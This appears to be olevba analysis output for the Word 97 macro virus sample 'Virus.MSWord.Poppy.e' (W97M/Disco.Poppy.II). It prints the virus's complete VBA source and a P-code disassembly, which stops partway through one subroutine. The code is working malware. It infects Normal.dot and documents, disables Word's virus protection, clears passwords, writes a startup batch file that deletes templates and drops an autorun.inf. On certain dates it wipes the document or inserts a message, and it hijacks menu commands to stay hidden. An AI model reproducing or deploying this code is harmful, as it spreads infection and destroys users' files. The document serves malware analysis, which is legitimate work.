olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poppy.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poppy.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Poppy.e - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub Main()

'W97M/Disco.Poppy.II"
'By VicodinES
'Macro Virus for Word 97
'This is what happens when Disco.Poppy gets raped by The Mighty Blee

    On Error Resume Next
    
    A$ = "a" + "u" + "to" + "O" + "p" + "en"
    Valium$ = "N" + "O" + "R" + "M" + "A" + "L" + "." + "D" + "OT"
    
    msfile$ = "c:\windows\startm~1\programs\startup\msfile.bat"

   
    If nfat = vbReadOnly Then Call vBitchES(msfile$)
    If nfat = vbReadOnly + vbArchive Then Call vBitchES(msfile$)
 
    If nfat = vbReadOnly Then GoTo fuckoff
    If nfat = vbReadOnly + vbArchive Then GoTo fuckoff
    
    
    Soma$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If Soma$ = Valium$ Then
        
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:=A$, Object:= _
        wdOrganizerObjectProjectItems
            
        
            ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
            Call dhIconDisco("C:\autorun.inf")
            
       
    Else
               
        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:=A$, Object:= _
        wdOrganizerObjectProjectItems
        
        If NormalTemplate.Saved = False Then NormalTemplate.Save
        
    End If
    
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
        .Password = ""
        .WritePassword = ""
    End With

        Application.OrganizerDelete Source:= _
        NormalTemplate.FullName, Name:="Cap", Object:= _
        wdOrganizerObjectProjectItems
        
GoTo fuckoff

Hell:
        
fuckoff:
    On Error GoTo -1: On Error GoTo 0


End Sub
Sub ViewVBCode()


MsgBox "  W97M/Disco.Poppy.II by VicodinES  ", vbOKOnly, " © The Narkotic Network "
MsgBox "Everything is fine - nothing to see here - let's move it along kids!", vbExclamation, " * VicodinES * Klonopin.Jones * Fastin.Blee * "
MsgBox "This is what happens when Disco.Poppy gets raped by The Mighty Blee", vbQuestion, "Slogan?"
End Sub
Sub vBitchES(strFile As String)
 
 Dim hFile As Long

 n$ = NormalTemplate
 Part1$ = "@echo off"
 Part11$ = "attrib -h -r "
 snag$ = "c:\progra~1\micros~1\templa~1\"
 snag1$ = "c:\progra~1\micros~2\templa~1\"
 Part2$ = "del "
 Part33$ = "cls"
 
     hFile = FreeFile
     Open strFile For Output Access Write As hFile
     Print #hFile, Part1$
     Print #hFile, Part11$ + snag$ + n$
     Print #hFile, Part11$ + snag1$ + n$
     Print #hFile, Part2$ + snag$ + n$
     Print #hFile, Part2$ + snag1$ + n$
     Print #hFile, Part33$
     Print #hFile, Part2$ + msfile$
     Close hFile
     
     GoTo Hell
     
Hell:

End Sub
Sub dhIconDisco(strFile As String)



Dim Part1$
Dim Part2$
Dim Part22$
Dim Part3$
Dim Part33$
Dim rn$
Dim rnn$
Dim Choice
Dim hFile As Long

Randomize

Choice = Int(Rnd * 2)
rnn$ = Int(Rnd * 66) + 2
rn$ = Int(Rnd * 27) + 1
Part1$ = "[autorun]"
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
Part3$ = Part2$ + rn$
Part33$ = Part22$ + rnn$


    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile


    
End Sub
Sub FileExit()

    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With

    Application.Quit

End Sub

Sub fileprint()


    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z

    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
        
    If Z = 1 Then
    
    Selection.EndKey Unit:=wdLine
    Selection.MoveDown Unit:=wdScreen, Count:=1
    Selection.EndKey Unit:=wdLine
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "When will you wake up and realize that we live in a "
    Selection.TypeText Text:= _
        "primitive society? Don't kid yourself - there is NO GOD!!"
        
    ActiveDocument.PrintOut
    
    
Else

    ActiveDocument.PrintOut
    
End If

End Sub
Sub FileTemplates()


    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z

    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
    
    
If Z = 1 Then

    With Options
        .CheckSpellingAsYouType = False
        .CheckGrammarAsYouType = False
        .SuggestSpellingCorrections = False
        .SuggestFromMainDictionaryOnly = False
        .CheckGrammarWithSpelling = True
        .ShowReadabilityStatistics = False
        .IgnoreUppercase = True
        .IgnoreMixedDigits = True
        .IgnoreInternetAndFileAddresses = True

    End With

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro.Poppy.I aka Disco.Poppy"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "By VicodinES"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro Virus for Word 97"
    Selection.TypeParagraph
        Selection.TypeParagraph
            Selection.TypeParagraph
                Selection.TypeParagraph
    Selection.TypeText Text:= _
        "T h e   N a r k o t i c   N e t w o r k !"
    Selection.TypeParagraph
    
Else

GoTo fuck1

End If

fuck1:


End Sub
Sub HelpAbout()


MsgBox "  W97M/Disco.Poppy.II by VicodinES  ", vbOKOnly, " © The Narkotic Network "
MsgBox "Everything is fine - nothing to see here - let's move it along kids!", vbExclamation, " * VicodinES * Klonopin.Jones * Fastin.Blee * "
MsgBox "Social camouflage for this modern age!", vbQuestion, "Slogan?"
End Sub
Public Sub ToolsMacro()


    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z


    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date


    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
    
If Z = 1 Then

    With Options
        .CheckSpellingAsYouType = False
        .CheckGrammarAsYouType = False
        .SuggestSpellingCorrections = False
        .SuggestFromMainDictionaryOnly = False
        .CheckGrammarWithSpelling = True
        .ShowReadabilityStatistics = False
        .IgnoreUppercase = True
        .IgnoreMixedDigits = True
        .IgnoreInternetAndFileAddresses = True

    End With

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro.Poppy.I aka Disco.Poppy"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "By VicodinES"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro Virus for Word 97"
    Selection.TypeParagraph
        Selection.TypeParagraph
            Selection.TypeParagraph
                Selection.TypeParagraph
    Selection.TypeText Text:= _
        "T h e   N a r k o t i c   N e t w o r k !"
    Selection.TypeParagraph
    
Else

GoTo fuck1

End If

fuck1:

End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Poppy.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/autoOpen - 17490 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Public Sub Main())
' Line #3:
' Line #4:
' 	QuoteRem 0x0000 0x0014 "W97M/Disco.Poppy.II""
' Line #5:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #6:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #7:
' 	QuoteRem 0x0000 0x0043 "This is what happens when Disco.Poppy gets raped by The Mighty Blee"
' Line #8:
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' Line #11:
' 	LitStr 0x0001 "a"
' 	LitStr 0x0001 "u"
' 	Add 
' 	LitStr 0x0002 "to"
' 	Add 
' 	LitStr 0x0001 "O"
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitStr 0x0002 "en"
' 	Add 
' 	St A$ 
' Line #12:
' 	LitStr 0x0001 "N"
' 	LitStr 0x0001 "O"
' 	Add 
' 	LitStr 0x0001 "R"
' 	Add 
' 	LitStr 0x0001 "M"
' 	Add 
' 	LitStr 0x0001 "A"
' 	Add 
' 	LitStr 0x0001 "L"
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitStr 0x0001 "D"
' 	Add 
' 	LitStr 0x0002 "OT"
' 	Add 
' 	St Valium$ 
' Line #13:
' Line #14:
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	St msfile$ 
' Line #15:
' Line #16:
' Line #17:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld msfile$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #18:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld msfile$ 
' 	ArgsCall (Call) vBitchES 0x0001 
' 	EndIf 
' Line #19:
' Line #20:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #21:
' 	Ld nfat 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo fuckoff 
' 	EndIf 
' Line #22:
' Line #23:
' Line #24:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St Soma$ 
' Line #25:
' Line #26:
' 	Ld Soma$ 
' 	Ld Valium$ 
' 	Eq 
' 	IfBlock 
' Line #27:
' Line #28:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld A$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #29:
' Line #30:
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #32:
' 	LitStr 0x000E "C:\autorun.inf"
' 	ArgsCall (Call) dhIconDisco 0x0001 
' Line #33:
' Line #34:
' Line #35:
' 	ElseBlock 
' Line #36:
' Line #37:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld A$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' Line #39:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #40:
' Line #41:
' 	EndIfBlock 
' Line #42:
' Line #43:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #44:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #45:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #46:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #47:
' 	EndWith 
' Line #48:
' Line #49:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #50:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #51:
' 	LitStr 0x0000 ""
' 	MemStWith Password 
' Line #52:
' 	LitStr 0x0000 ""
' 	MemStWith WritePassword 
' Line #53:
' 	EndWith 
' Line #54:
' Line #55:
' 	LineCont 0x0008 05 00 08 00 0F 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0003 "Cap"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #56:
' Line #57:
' 	GoTo fuckoff 
' Line #58:
' Line #59:
' 	Label Hell 
' Line #60:
' Line #61:
' 	Label fuckoff 
' Line #62:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #63:
' Line #64:
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Sub ViewVBCode())
' Line #67:
' Line #68:
' Line #69:
' 	LitStr 0x0024 "  W97M/Disco.Poppy.II by VicodinES  "
' 	Ld vbOKOnly 
' 	LitStr 0x0018 " © The Narkotic Network "
' 	ArgsCall MsgBox 0x0003 
' Line #70:
' 	LitStr 0x0044 "Everything is fine - nothing to see here - let's move it along kids!"
' 	Ld vbExclamation 
' 	LitStr 0x002E " * VicodinES * Klonopin.Jones * Fastin.Blee * "
' 	ArgsCall MsgBox 0x0003 
' Line #71:
' 	LitStr 0x0043 "This is what happens when Disco.Poppy gets raped by The Mighty Blee"
' 	Ld vbQuestion 
' 	LitStr 0x0007 "Slogan?"
' 	ArgsCall MsgBox 0x0003 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub vBitchES(strFile As String))
' Line #74:
' Line #75:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #76:
' Line #77:
' 	Ld NormalTemplate 
' 	St n$ 
' Line #78:
' 	LitStr 0x0009 "@echo off"
' 	St Part1$ 
' Line #79:
' 	LitStr 0x000D "attrib -h -r "
' 	St Part11$ 
' Line #80:
' 	LitStr 0x001E "c:\progra~1\micros~1\templa~1\"
' 	St snag$ 
' Line #81:
' 	LitStr 0x001E "c:\progra~1\micros~2\templa~1\"
' 	St snag1$ 
' Line #82:
' 	LitStr 0x0004 "del "
' 	St Part2$ 
' Line #83:
' 	LitStr 0x0003 "cls"
' 	St Part33$ 
' Line #84:
' Line #85:
' 	Ld Friend 
' 	St hFile 
' Line #86:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #87:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part1$ 
' 	PrintItemNL 
' Line #88:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #89:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #90:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #91:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #92:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part33$ 
' 	PrintItemNL 
' Line #93:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld msfile$ 
' 	Add 
' 	PrintItemNL 
' Line #94:
' 	Ld hFile 
' 	Close 0x0001 
' Line #95:
' Line #96:
' 	GoTo Hell 
' Line #97:
' Line #98:
' 	Label Hell 
' Line #99:
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Sub dhIconDisco(strFile As String))
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' 	Dim 
' 	VarDefn Part1
' Line #106:
' 	Dim 
' 	VarDefn Part2
' Line #107:
' 	Dim 
' 	VarDefn Part22
' Line #108:
' 	Dim 
' 	VarDefn Part3
' Line #109:
' 	Dim 
' 	VarDefn Part33
' Line #110:
' 	Dim 
' 	VarDefn rn
' Line #111:
' 	Dim 
' 	VarDefn rnn
' Line #112:
' 	Dim 
' 	VarDefn Choice
' Line #113:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #114:
' Line #115:
' 	ArgsCall Read 0x0000 
' Line #116:
' Line #117:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St Choice 
' Line #118:
' 	Ld Rnd 
' 	LitDI2 0x0042 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St rnn$ 
' Line #119:
' 	Ld Rnd 
' 	LitDI2 0x001B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St rn$ 
' Line #120:
' 	LitStr 0x0009 "[autorun]"
' 	St Part1$ 
' Line #121:
' 	LitStr 0x0024 "icon = c:\windows\system\pifmgr.dll,"
' 	St Part2$ 
' Line #122:
' 	LitStr 0x0025 "icon = c:\windows\SYSTEM\shell32.dll,"
' 	St Part22$ 
' Line #123:
' 	Ld Part2$ 
' 	Ld rn$ 
' 	Add 
' 	St Part3$ 
' Line #124:
' 	Ld Part22$ 
' 	Ld rnn$ 
' 	Add 
' 	St Part33$ 
' Line #125:
' Line #126:
' Line #127:
' 	Ld Friend 
' 	St hFile 
' Line #128:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #129:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part1$ 
' 	PrintItemNL 
' Line #130:
' 	Ld Choice 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #131:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part3$ 
' 	PrintItemNL 
' Line #132:
' 	ElseBlock 
' Line #133:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part33$ 
' 	PrintItemNL 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	Ld hFile 
' 	Close 0x0001 
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub FileExit())
' Line #141:
' Line #142:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #143:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #144:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #145:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #146:
' 	EndWith 
' Line #147:
' Line #148:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #149:
' Line #150:
' 	EndSub 
' Line #151:
' Line #152:
' 	FuncDefn (Sub fileprint())
' Line #153:
' Line #154:
' Line #155:
' 	Dim 
' 	VarDefn D
' Line #156:
' 	Dim 
' 	VarDefn Ti
' Line #157:
' 	Dim 
' 	VarDefn Tp
' Line #158:
' 	Dim 
' 	VarDefn Z
' Line #159:
' Line #160:
' 	Ld Time 
' 	St Ti$ 
' Line #161:
' 	LitStr 0x000B "12:00:01 PM"
' 	St Tp$ 
' Line #162:
' 	Ld Date 
' 	St D$ 
' Line #163:
' Line #164:
' 	LitDI2 0x0000 
' 	St Z 
' Line #165:
' Line #166:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #167:
' 	Ld Ti$ 
' 	Ld Tp$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #168:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #169:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #170:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #171:
' 	Ld D$ 
' 	LitStr 0x0007 "6/14/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #172:
' 	Ld D$ 
' 	LitStr 0x0007 "1/22/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #173:
' 	Ld D$ 
' 	LitStr 0x0007 "8/21/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #174:
' 	Ld D$ 
' 	LitStr 0x0007 "9/19/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #175:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #176:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #177:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #178:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #179:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #180:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #181:
' Line #182:
' 	Ld Z 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #183:
' Line #184:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #185:
' 	Ld wdScreen 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0002 
' Line #186:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #187:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #188:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #189:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #190:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0034 "When will you wake up and realize that we live in a "
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #191:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0039 "primitive society? Don't kid yourself - there is NO GOD!!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #192:
' Line #193:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #194:
' Line #195:
' Line #196:
' 	ElseBlock 
' Line #197:
' Line #198:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #199:
' Line #200:
' 	EndIfBlock 
' Line #201:
' Line #202:
' 	EndSub 
' Line #203:
' 	FuncDefn (Sub FileTemplates())
' Line #204:
' Line #205:
' Line #206:
' 	Dim 
' 	VarDefn D
' Line #207:
' 	Dim 
' 	VarDefn Ti
' Line #208:
' 	Dim 
' 	VarDefn Tp
' Line #209:
' 	Dim 
' 	VarDefn Z
' Line #210:
' Line #211:
' 	Ld Time 
' 	St Ti$ 
' Line #212:
' 	LitStr 0x000B "12:00:01 PM"
' 	St Tp$ 
' Line #213:
' 	Ld Date 
' 	St D$ 
' Line #214:
' Line #215:
' 	LitDI2 0x0000 
' 	St Z 
' Line #216:
' Line #217:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #218:
' 	Ld Ti$ 
' 	Ld Tp$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #219:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #220:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #221:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #222:
' 	Ld D$ 
' 	LitStr 0x0007 "6/14/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #223:
' 	Ld D$ 
' 	LitStr 0x0007 "1/22/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #224:
' 	Ld D$ 
' 	LitStr 0x0007 "8/21/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #225:
' 	Ld D$ 
' 	LitStr 0x0007 "9/19/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #226:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #227:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #228:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/99"
' 	Eq 
' 	If 
